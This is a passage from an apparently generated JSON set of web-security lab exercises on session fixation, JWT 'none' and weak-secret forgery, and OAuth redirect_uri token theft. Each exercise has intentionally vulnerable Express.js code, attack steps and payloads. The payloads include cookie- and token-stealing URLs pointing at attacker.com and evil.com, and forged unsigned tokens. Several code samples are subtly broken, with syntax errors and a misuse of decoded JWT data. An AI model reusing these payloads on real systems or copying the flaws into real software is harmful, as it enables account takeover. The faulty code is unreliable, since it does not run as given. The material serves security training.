      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': { password: 'hunter2' } }; app.get('/login', (req, res) => { const session = req.cookies.session || 'sess_' + Math.random().toString(36).substring(2); res.setHeader('Set-Cookie', `session=${session}; HttpOnly`); res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\" /><br/>Password: <input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.send(`Welcome ${username}`); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; if (sess && sess.startsWith('sess_')) { res.send('Account page for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
      "payloads": [
        "sess_presetcookievalue12345",
        "<img src='http://attacker.com?cookie=sess_presetcookievalue12345'>",
        "document.cookie='session=sess_presetcookievalue12345';"
      ]
    },
    {
      "Lab scenario": "JWT tampering via none algorithm",
      "Lab Description": "The application improperly accepts unsigned JWTs by trusting the 'none' algorithm when parsing tokens. This leads to privilege escalation. To solve: forge a JWT as 'admin' and access the admin panel without a valid signature.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a valid JWT using Burp Suite from a POST /login request",
        "Decode the JWT and inspect its header and payload at jwt.io",
        "Replace alg to 'none' and set payload to {\"username\":\"admin\"}",
        "Strip the signature completely and send the tampered token in Authorization: Bearer header",
        "Access /admin/dashboard to confirm unauthorized access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { admin: { password: 'adminpass' }, user: { password: 'userpass' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin/dashboard', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const payload = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (payload.username === 'admin') res.send('Welcome to admin panel'); else res.status(403).send('Access denied'); } catch (e) { res.status(400).send('JWT Error'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation",
      "Lab Description": "The OAuth implementation lacks proper redirect URI validation. Attackers can inject malicious redirect URIs to steal tokens. The application accepts arbitrary URLs in the `redirect_uri` parameter during login. To solve: trick the server into redirecting the victim's token to your domain.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start Burp Suite and capture the initial OAuth request containing the redirect_uri parameter",
        "Replace the redirect_uri with your attacker-controlled domain (e.g. https://evil.com/token-stealer)",
        "Send the crafted URL to the victim via social engineering",
        "Wait for the victim to authorize and capture the access_token sent to your domain",
        "Replay the token using Postman in Authorization header to access protected resource"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id !== 'trusted-app') return res.status(400).send('Invalid client'); const url = `${redirect_uri}?access_token=${tokens['carlos']}`; res.redirect(url); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === 'abc123token') res.send('Carlos profile'); else res.status(403).send('Invalid token'); }); app.listen(5000, () => console.log('OAuth Redirect URI Lab running on port 5000'));",
      "payloads": [
        "https://vulnerable-app.com/auth?client_id=trusted-app&redirect_uri=https://evil.com/token-stealer&response_type=token",
        "https://evil.com/token-stealer?access_token=abc123token",
        "Authorization: Bearer abc123token"
      ]
    },
    {
      "Lab scenario": "JWT secret key brute-force in REST API login",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. The secret key used to sign the JWTs is weak and guessable. Tokens are validated purely on signature without proper expiration or audience claims. To solve: forge a valid JWT for the user 'carlos' using a brute-forced secret and access his account endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a login request using Burp Suite and extract the JWT from the response.",
        "Use jwt_tool.py or Postman to decode and analyze the JWT header and payload.",
        "Run a brute-force attack with jwt-cracker or hashcat using a wordlist to identify the correct secret key.",
        "Recreate a token with the username changed to 'carlos', and sign it using the cracked secret.",
        "Send a GET /api/account request with the forged JWT in the Authorization header to verify successful exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'admin123', 'carlos': 'carlos789' }; const SECRET_KEY = 'admin'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, SECRET_KEY); return res.json({ token }); } res.status(401).json({ error: 'Invalid credentials' }); }); app.get('/api/account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.username === 'carlos') return res.send('Account details for carlos'); return res.status(403).send('Unauthorized'); } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Brute-force Lab running on port 3000'));",
      "payloads": [
        "jwt_tool.py -t <token> -d -C -S -p -k /usr/share/wordlists/rockyou.txt",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.<valid_signature>",
        "jwt.io > manually modified payload with username 'carlos', signed with secret 'admin'"
      ]
    },
    {
      "Lab scenario": "Session fixation via insecure redirect",
      "Lab Description": "The login system fails to regenerate session tokens after authentication. Attackers can predetermine session IDs and force the victim to authenticate using them. The application accepts session IDs from the URL and uses them directly. To solve: fixate a known session ID and get Carlos to log in, then reuse that session ID to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to register a user and analyze session handling behavior via Set-Cookie headers.",
        "Create a crafted link with a predetermined session ID using GET /login?session=attackerSession123 and send to Carlos (assumed simulated action).",
        "Wait for Carlos to log in using that link, which binds his session to attackerSession123.",
        "Send a request to /dashboard with the cookie session=attackerSession123 to access Carlos's session.",
        "Validate session takeover by confirming personalized content or account information."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; const users = { 'carlos': 'secure456' }; app.get('/login', (req, res) => { const sessId = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', sessId); res.send('Login page'); }); app.post('/auth', (req, res) => { const { username, password } = req.body; const sessId = req.cookies.session; if (users[username] === password) { sessions[sessId] = username; return res.redirect('/dashboard'); } res.status(401).send('Invalid credentials'); }); app.get('/dashboard', (req, res) => { const sessId = req.cookies.session; if (sessions[sessId] === 'carlos') return res.send('Carlos's Dashboard'); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
      "payloads": [
        "GET /login?session=attackerSession123",
        "Cookie: session=attackerSession123",
        "POST /auth { username: 'carlos', password: 'secure456' }",
        "GET /dashboard with Cookie: session=attackerSession123"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow token leak via referer header",
      "Lab Description": "The application uses OAuth 2.0 implicit flow and redirects tokens via the URL fragment. This fragment gets exposed through the HTTP Referer header when navigating to third-party resources. To solve: intercept the access token issued to Carlos and reuse it to access his account profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept an OAuth redirect request using Burp Suite, where the access_token is present in the URL fragment.",
        "Identify an embedded resource (e.g., image or iframe) in the post-login redirect that leaks the full URL including the token in the Referer header.",
        "Use a malicious external endpoint or inspect simulated logs to recover the leaked token.",
        "Send a GET /user/profile request with Authorization: Bearer <leaked_token> to gain access to Carlos's profile.",
        "Confirm access to protected resources without needing to reauthenticate."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const accessTokens = { 'carlos': 'token-carlos-abc' }; app.get('/oauth/callback', (req, res) => { res.send(`<html><body><img src='http://attacker.com/steal?ref=${req.headers.referer}' /><script>location.href='/profile#access_token=token-carlos-abc';</script></body></html>`); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token-carlos-abc') return res.send('Carlos profile info'); res.status(403).send('Access Denied'); }); app.listen(5000, () => console.log('OAuth Token Leak Lab running on port 5000'));",
      "payloads": [
        "GET /oauth/callback → Referer logs leak access_token=token-carlos-abc",
        "Authorization: Bearer token-carlos-abc",
        "GET /profile with header: Authorization: Bearer token-carlos-abc"
      ]
    },
    {
      "Lab scenario": "JWT secret key brute-force in REST API Authorization Header",
      "Lab Description": "This lab involves a JWT-based authorization system where the backend uses a weak secret key to sign tokens. The application validates JWT tokens included in the `Authorization: Bearer` header for API access. However, it fails to implement strong key management. To solve: Forge a valid admin JWT using brute-force and access the protected admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.Using Burp Suite, intercept a valid request to /api/profile and copy the Authorization JWT token.",
        "2.Send the JWT to jwt.io to analyze its algorithm (HS256) and claims structure.",
        "3.Use `jwt-cracker` or `john` with rockyou.txt to brute-force the weak HMAC secret.",
        "4.Craft a new JWT token with header `{ alg: 'HS256' }` and payload `{ \"username\": \"admin\", \"role\": \"admin\" }` signed with the cracked secret.",
        "5.Use Postman to send a GET request to /api/admin-dashboard with the forged JWT in the Authorization header and verify successful access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'letmein'; app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const user = jwt.verify(token, SECRET); res.json({ message: `Hello ${user.username}` }); } catch { res.status(403).send('Invalid token'); } }); app.get('/api/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const user = jwt.verify(token, SECRET); if (user.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to admin dashboard'); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "Authorization: Bearer <JWT with payload { \"username\": \"admin\", \"role\": \"admin\" } signed with 'letmein'>",
        "JWT brute-forced secret: letmein"
      ]
    },
    {
      "Lab scenario": "Session fixation in login endpoint with reusable session ID",
      "Lab Description": "The application sets a session ID cookie before authentication and does not regenerate it post-login. This allows attackers to fixate a victim's session by pre-defining the session cookie and tricking them into logging in using it. To solve: Log into Carlos's account by fixing a session ID and reusing it.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite to send a GET request to /login and note the Set-Cookie: sessionId=xyz header.",
        "2.Copy this session ID and send a crafted phishing link to Carlos with the pre-set session ID cookie.",
        "3.After Carlos logs in using the attacker-defined session, reuse the same session ID in a GET /my-account request.",
        "4.In Burp, add Cookie: sessionId=xyz and send the request to /my-account to access Carlos’s session.",
        "5.Verify lab success by reading Carlos's personal data from the account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(7); res.cookie('sessionId', sid); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.sessionId; sessions[sid] = user.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) return res.send(`Welcome ${sessions[sid]}`); res.status(403).send('Forbidden'); }); app.listen(4000);",
      "payloads": [
        "GET /login → extract sessionId from Set-Cookie",
        "Send phishing link with fixed sessionId cookie to victim",
        "Reuse sessionId in Cookie header after victim login"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation leading to account takeover",
      "Lab Description": "The application uses OAuth for third-party login but improperly validates redirect URIs during the authentication handshake. An attacker can tamper with the redirect_uri parameter to receive the authorization code for another user. To solve: Steal Carlos’s OAuth code and use it to link his account to yours.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite to intercept the initial /auth/google request and observe the redirect_uri parameter.",
        "2.Change the redirect_uri to a domain controlled by the attacker (e.g. attacker.com/oauth-callback) and host a listener.",
        "3.Send Carlos a phishing link with the modified redirect_uri and trick him into authenticating.",
        "4.Receive Carlos’s OAuth authorization code on your listener and exchange it for a valid access token via Google's token endpoint.",
        "5.Send a POST request to /oauth/callback with Carlos's token and gain access to his account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/auth/google', (req, res) => { const redirectUri = req.query.redirect_uri; const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=abc123&redirect_uri=${redirectUri}&scope=profile`; res.redirect(authUrl); }); app.post('/oauth/callback', async (req, res) => { const { code } = req.body; const response = await axios.post('https://oauth2.googleapis.com/token', { code, client_id: 'abc123', client_secret: 'secret', redirect_uri: req.headers.referer, grant_type: 'authorization_code' }); const accessToken = response.data.access_token; res.send(`Access token: ${accessToken}`); }); app.listen(4000);",
      "payloads": [
        "Modified redirect_uri=https://attacker.com/oauth-callback",
        "OAuth token request using stolen code",
        "POST /oauth/callback with code=<Carlos’s code>"
      ]
    },
    {
      "Lab scenario": "JWT Signature None Bypass in Token Verification",
      "Lab Description": "The application verifies JWT tokens without enforcing strict validation of the algorithm used. The vulnerable component fails to check if the 'alg' parameter is set to 'none'. The application accepts this altered token as valid, allowing attackers to forge tokens and impersonate users. To solve: forge a valid JWT for the user 'carlos' using algorithm 'none' and access the /my-account endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman or Burp Suite to capture the JWT after logging in with your own account.",
        "Decode the JWT using jwt.io or a Python script to inspect the header and payload.",
        "Modify the header to set 'alg' to 'none' and change the payload to {\"username\":\"carlos\"}. Remove the signature.",
        "Re-encode the modified JWT and send it with a new Authorization: Bearer header in a request to /my-account.",
        "Verify access is granted to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos' }, { username: 'wiener' }]; app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); return res.send(`Welcome ${payload.username}`); } jwt.verify(token, 'secret'); const verifiedPayload = jwt.decode(token); res.send(`Welcome ${verifiedPayload.username}`); } catch { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('JWT None Bypass running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "{\"alg\":\"none\"}.{ \"username\":\"carlos\" }."
      ]
    },
    {
      "Lab scenario": "OAuth Token Leakage in Redirect URL Handler",
      "Lab Description": "The OAuth flow in this application mishandles access tokens by reflecting them in the URL. A malicious actor can harvest tokens via browser history or referer headers. The application redirects to a vulnerable page with tokens embedded. To solve: steal the access token issued to Carlos and use it to access /my-account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the OAuth authorization request.",
        "Notice the access token returned in the URL as a query string: /redirect?access_token=....",
        "Craft a malicious redirect_uri to exfiltrate this token using a web server you control (e.g., requestbin).",
        "Force the victim (Carlos) to authenticate via the crafted link and capture the token.",
        "Replay the request to /my-account using Authorization: Bearer <stolen_token>."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const accessTokens = { 'carlos-token': 'carlos' }; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = 'carlos-token'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const user = accessTokens[token]; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(3000, () => console.log('OAuth Token Leak running'));",
      "payloads": [
        "https://attacker.com/redirect?access_token=carlos-token",
        "Authorization: Bearer carlos-token"
      ]
    },
    {
      "Lab scenario": "Session Fixation in Login Session Initialization",
      "Lab Description": "The application allows users to supply their own session identifiers before authentication. Session tokens are not regenerated after login, enabling fixation. The attacker can fix a session ID and trick a victim into logging in with it. To solve: fix a session ID for Carlos, wait for login, then access /dashboard using the same session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to initiate a session by visiting / and setting a custom session ID like session=attacker123.",
        "Send the session link (with the pre-set session ID) to the victim via phishing (e.g., /login with ?session=attacker123).",
        "Wait until the victim logs in using the fixed session.",
        "Use the same session ID to access the /dashboard endpoint.",
        "Validate that the response shows Carlos's data, confirming successful session fixation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 's3cret' }; app.use((req, res, next) => { let sid = req.cookies.session || req.query.session || `sess-${Math.random()}`; res.cookie('session', sid); if (!sessions[sid]) sessions[sid] = {}; req.session = sessions[sid]; next(); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) res.send(`Dashboard for ${req.session.user}`); else res.status(403).send('Not authenticated'); }); app.listen(5000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "/?session=attacker123",
        "POST /login with session=attacker123, username=carlos, password=s3cret",
        "GET /dashboard with cookie session=attacker123"
      ]
    },
    {
      "Lab scenario": "JWT signature none bypass in authentication header",
      "Lab Description": "The authentication system uses JWTs but fails to validate tokens with the 'none' algorithm. The application uses the JWT in the Authorization header for access control but does not enforce proper algorithm checks during signature verification. To solve: craft a forged JWT with algorithm set to 'none' and access Carlos's account endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a valid JWT using Burp Suite Proxy after logging into your own account.",
        "Send the request to Burp Repeater and observe the JWT format: header.payload.signature.",
        "Modify the JWT header to {\"alg\":\"none\"} and remove the signature section entirely.",
        "In the JWT payload, change the username from your own to 'carlos'. Re-encode the token using Base64 without padding.",
        "Replace the Authorization header with the tampered token and resend the request to the protected /account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "OAuth redirect_uri manipulation in login flow",
      "Lab Description": "The application uses a third-party OAuth provider for login and redirects users based on the 'redirect_uri' parameter. The redirect URI is insufficiently validated, allowing attackers to steal authorization codes. To solve: intercept and modify the OAuth flow to capture Carlos's code and log in as him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Start the login process and observe the OAuth redirection request in Burp Suite with a redirect_uri parameter.",
        "Send the request to Repeater and change redirect_uri to your own attacker-controlled domain that captures query parameters.",
        "Send the modified link to Carlos through any injection point (e.g., comment box or support message) if social engineering is enabled.",
        "Wait for Carlos to click the malicious link and capture the code from your HTTP server.",
        "Exchange the stolen code manually using Postman to retrieve Carlos's access_token and use it to call the /account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth-callback', async (req, res) => { const { code, redirect_uri } = req.query; try { const response = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const token = response.data.access_token; res.cookie('session', token); res.redirect('/account'); } catch (e) { res.status(400).send('OAuth error'); } }); app.get('/account', (req, res) => { const token = req.cookies.session; if (token === 'carlos_token') { res.send('Account details for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "https://auth.example.com/authorize?client_id=app123&redirect_uri=https://evil.com/capture",
        "code=abc123&redirect_uri=https://evil.com/capture"
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow via Set-Cookie header manipulation",
      "Lab Description": "The application assigns the session ID before login and does not rotate it upon authentication. This flaw allows attackers to fixate a known session ID for the victim before login. To solve: predefine a session ID, trick Carlos into logging in, and reuse the same session to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, access the site as an unauthenticated user and capture the Set-Cookie response.",
        "Override the session cookie with a custom predictable value using a browser plugin or a crafted link.",
        "Send Carlos a link to log in via a session already set by you (e.g., through CSRF or phishing).",
        "Once Carlos logs in using the fixed session, reuse that same session cookie in your browser.",
        "Access the /account page and verify Carlos’s account data is shown."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/', (req, res) => { let sid = req.cookies.sid || 'sess_' + Math.random().toString(36).substring(2); res.cookie('sid', sid); sessions[sid] = { username: null }; res.send('Guest session initiated'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].username = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "sid=sess_fixedtoken1234",
        "GET /login?username=carlos&password=hunter2 (with sid=sess_fixedtoken1234 in cookie)",
        "GET /account (with same sid cookie)"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation in authentication flow",
      "Lab Description": "The OAuth implementation in this application contains weak validation of redirect URIs. This allows an attacker to hijack tokens by injecting malicious domains. The application blindly trusts user-controlled redirect_uri parameters during the OAuth login flow, enabling redirection to external, attacker-controlled endpoints. To solve: capture an OAuth access token issued for Carlos by manipulating the redirect flow and use it to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the initial OAuth authorization request",
        "Confirm the redirect_uri parameter is not validated properly by sending it to a malicious domain you control",
        "Craft a malicious authorization request with redirect_uri=https://evil.com/callback",
        "Set up a listener on https://evil.com to capture the OAuth access token fragment or query",
        "Use Postman to send a request with the stolen token as Authorization: Bearer {token} to /api/userinfo to confirm access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthServer = { authorize: (client_id, redirect_uri, state) => `${redirect_uri}?code=abc123&state=${state}` }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const redirectURL = oauthServer.authorize(client_id, redirect_uri, state); res.redirect(redirectURL); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth redirect flow vulnerable lab on port ${PORT}`));",
      "payloads": [
        "https://attacker.com/callback",
        "https://evil.example.com/oauth-steal",
        "http://malicious.io/redirect#access_token=steal"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "The application allows attackers to set session cookies before authentication and reuses them post-login. This allows a session fixation attack where the attacker sets their own session ID, tricks the victim into using it, and later hijacks the session after the victim logs in. To solve: pre-set a session ID, force Carlos to authenticate using it, then hijack the session to access his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a GET /login request while setting your custom session cookie using Burp Suite",
        "Send this fixed session link to Carlos via social engineering or lure (simulate manually)",
        "Once Carlos logs in using that session, reuse the session ID to access /my-account",
        "Verify account access by visiting /my-account with the fixed session",
        "Capture the personalized response and extract sensitive user data"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sessionId = req.cookies.session || Math.random().toString(36).substring(2); sessions[sessionId] = { authenticated: false }; res.cookie('session', sessionId); res.send('Login form'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; if (sessionId && sessions[sessionId]) { sessions[sessionId].authenticated = true; res.send('Logged in'); } else { res.status(400).send('Session missing'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; if (sessions[sessionId]?.authenticated) res.send('Welcome Carlos'); else res.status(401).send('Unauthorized'); }); app.listen(4001);",
      "payloads": [
        "Cookie: session=fixedSession123",
        "http://target-app/login (with session=fixed123)",
        "Session fixation via iframe + set-cookie header"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in access token validation",
      "Lab Description": "The application uses JWTs to authorize access to user accounts but fails to enforce signature verification properly. It blindly accepts tokens where the alg field is set to 'none'. To solve: forge a JWT with alg=none and payload containing 'username':'carlos', then use it to access Carlos's account via the protected endpoint.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Capture a legitimate JWT using Burp Suite after logging in",
        "Decode the token using jwt.io or Burp Decoder",
        "Create a new token with alg set to none and payload { \"username\": \"carlos\" }",
        "Remove the signature part and send the token in the Authorization header",
        "Access the protected endpoint /api/account using the forged token"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Access granted to Carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(4002);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer [none-alg payload]",
        "JWT with header: { \"alg\": \"none\" }, payload: { \"username\": \"carlos\" }"
      ]
    },
    {
      "Lab scenario": "JWT signature validation bypass in API endpoint",
      "Lab Description": "This lab's backend relies on JSON Web Tokens (JWT) to validate user sessions. However, it fails to enforce proper algorithm checks. The application incorrectly accepts tokens signed with the 'none' algorithm. To solve: Access Carlos's data through the protected /api/user endpoint by forging a valid-looking JWT.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a request to /api/user while logged in as your own user. Extract the Authorization: Bearer token.",
        "Copy the JWT and decode it using jwt.io or Burp Decoder. Observe the structure and claims.",
        "Replace the 'alg' field from 'HS256' to 'none' and modify the 'sub' claim to 'carlos'.",
        "Remove the signature segment entirely, leaving only the header and payload segments separated by two dots.",
        "Send the forged token in a request to /api/user with Authorization: Bearer [modified-token]. Verify successful access to Carlos's data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: { role: 'admin', data: 'Secret data' } }; app.get('/api/user', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token provided'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); const user = users[payload.sub]; if (user) return res.json(user); return res.status(403).send('Invalid user'); } try { const verified = jwt.verify(token, 'super-secret-key'); const user = users[verified.sub]; if (user) return res.json(user); return res.status(403).send('Invalid user'); } catch (e) { return res.status(403).send('Token verification failed'); } }); const PORT = 4000; app.listen(PORT, () => console.log(JWT Bypass Lab running on http://localhost:${PORT}));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow",
      "Lab Description": "This lab's login system is vulnerable to session fixation due to the reuse of session identifiers across authentication boundaries. Attackers can preset a session cookie and trick a victim into logging in with it. To solve: Fix a session ID, log Carlos in using it, then use the same session to access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to send a GET request to /login with a custom session ID cookie (e.g., session=attacker123).",
        "Send a valid login request for Carlos using his credentials while preserving the same session cookie value.",
        "Once Carlos is authenticated under that session ID, reuse the session=attacker123 cookie in a new GET request to /my-account.",
        "Confirm access to Carlos's authenticated session.",
